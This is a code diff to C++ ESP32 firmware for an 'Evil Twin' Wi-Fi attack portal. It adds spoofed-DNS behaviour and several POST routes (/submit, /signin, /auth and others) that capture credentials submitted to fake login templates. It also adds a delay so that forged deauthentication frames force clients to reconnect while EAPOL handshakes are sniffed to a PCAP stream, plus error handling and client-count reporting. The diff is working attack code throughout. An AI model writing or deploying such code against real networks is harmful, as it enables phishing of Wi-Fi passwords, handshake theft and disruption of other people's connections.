@@ -24,6 +24,10 @@
 namespace {
 constexpr const char* PORTAL_HTML_PATH = "/portal/index.html";
 constexpr uint32_t DEAUTH_BURST_PAUSE_MS = 3000;
+// Give the host time to subscribe to the PCAP stream after START_PORTAL
+// returns before the first deauth/reconnect handshake can begin.
+constexpr uint32_t DEAUTH_START_GRACE_MS = 1000;
+constexpr uint32_t STATION_COUNT_POLL_INTERVAL_MS = 1000;
 constexpr uint32_t PORTAL_AP_RESET_SETTLE_MS = 750;
 constexpr uint32_t PORTAL_AP_RETRY_SETTLE_MS = 1000;
 constexpr uint32_t PORTAL_AP_START_SETTLE_MS = 350;
@@ -52,6 +56,9 @@ bool PortalManager::setupDNSSpoof() {
     if (_dnsServer) return true;
     _dnsServer = new DNSServer();
     if (!_dnsServer) return false;
+    // Keep wildcard captive-portal answers positive. The default non-existent
+    // domain code can make clients treat a portal probe as a hard DNS failure.
+    _dnsServer->setErrorReplyCode(DNSReplyCode::NoError);
     const bool started = _dnsServer->start(53, "*", IPAddress(192, 168, 4, 1));
     if (!started) {
         delete _dnsServer;
@@ -324,19 +331,42 @@ void PortalManager::setupRoutes() {
         handleCaptiveSubmission(request, "GET /login");
     });
 
+    // A small set of common custom-template form actions. This intentionally
+    // avoids a catch-all POST handler while covering the routes used by most
+    // captive-portal templates.
+    _server->on("/", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /");
+    });
+    _server->on("/submit", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /submit");
+    });
+    _server->on("/connect", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /connect");
+    });
+    _server->on("/signin", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /signin");
+    });
+    _server->on("/auth", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /auth");
+    });
+    _server->on("/authorize", HTTP_POST, [handleCaptiveSubmission](AsyncWebServerRequest* request) {
+        handleCaptiveSubmission(request, "POST /authorize");
+    });
+
     _server->onNotFound([this](AsyncWebServerRequest* request) {
-        // Force every unmatched URI to the landing page. This covers OS captive
-        // probe paths, arbitrary 404s, and user-typed URLs without relying on
-        // the client following a redirect. /login and /continue remain routed
-        // by their explicit handlers above. Serving the page directly also
-        // prevents redirect loops on clients that do not follow 3xx responses.
+        // Existing routes render content directly. Unknown paths enter the
+        // normal portal flow through an HTTP redirect, but arbitrary unknown
+        // POST bodies are not treated as credentials.
         emitClientSeen(request, "forced route");
-        sendLandingResponse(request);
+        request->redirect("/");
     });
 }
 
 void PortalManager::deauthTaskFn(void* pv) {
     auto* self = (PortalManager*)pv;
+    // START_PORTAL has already returned to the host by this point. Wait for
+    // the app to attach its PCAP collector before forcing a reconnect.
+    vTaskDelay(pdMS_TO_TICKS(DEAUTH_START_GRACE_MS));
     uint8_t frame[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7};
     memcpy(frame+10, self->_targetBssid, 6);
     memcpy(frame+16, self->_targetBssid, 6);
@@ -529,6 +559,8 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
     }
 
     _running = true;
+    _lastStationCount = 0;
+    _lastStationCountPollMs = millis();
     if (dnsHijackEnabled) {
         Sniffer::instance()->setDnsHijack(true, WiFi.softAPIP());
     }
@@ -537,7 +569,19 @@ bool PortalManager::start(const char* ssid, uint8_t channel, const uint8_t* targ
         _hasTarget = true;
         Sniffer::instance()->setEapolFilter(true, targetBssid);
         _snifferStarted = Sniffer::instance()->startFixed(channel);
-        xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle);
+        if (!_snifferStarted) {
+            if (error) *error = "capture start failed";
+            NRSUITE_DEBUG_PRINTLN("PORTAL: EAPOL capture start failed");
+            cleanupFailedStart();
+            return false;
+        }
+        if (xTaskCreate(deauthTaskFn, "DeauthTask", 4096, this, 1, &_deauthTaskHandle) != pdPASS) {
+            _deauthTaskHandle = nullptr;
+            if (error) *error = "deauth task start failed";
+            NRSUITE_DEBUG_PRINTLN("PORTAL: deauth task start failed");
+            cleanupFailedStart();
+            return false;
+        }
     } else if (dnsHijackEnabled) {
         _snifferStarted = Sniffer::instance()->startDnsHijack(channel);
     }
@@ -649,7 +693,24 @@ bool PortalManager::resetHtml(size_t expectedSize) {
 }
 
 void PortalManager::update() {
+    // ESP32's DNSServer is AsyncUDP-backed; processNextRequest() is a
+    // compatibility no-op. Keep it for API compatibility, then report SoftAP
+    // station-count changes so the app can show the real Evil Twin client count.
     if (_running && _dnsServer) _dnsServer->processNextRequest();
+    if (!_running || !_apStarted || !_proto) return;
+
+    const uint32_t now = millis();
+    if (now - _lastStationCountPollMs < STATION_COUNT_POLL_INTERVAL_MS) return;
+    _lastStationCountPollMs = now;
+    const uint8_t count = WiFi.softAPgetStationNum();
+    if (count == _lastStationCount) return;
+    _lastStationCount = count;
+
+    JsonDocument event;
+    event["type"] = "portal_sta_count";
+    event["clients"] = count;
+    event["timestamp"] = now;
+    _proto->sendEvent("portal_sta_count", event);
 }
 
 void PortalManager::stop() {
@@ -659,6 +720,8 @@ void PortalManager::stop() {
     _showNotice = true;
     _loginAttempts = 0;
     _hasTarget = false;
+    _lastStationCount = 0;
+    _lastStationCountPollMs = 0;
     if (_deauthTaskHandle) { vTaskDelete(_deauthTaskHandle); _deauthTaskHandle = nullptr; }
     Sniffer::instance()->setDnsHijack(false);
     if (_snifferStarted) {
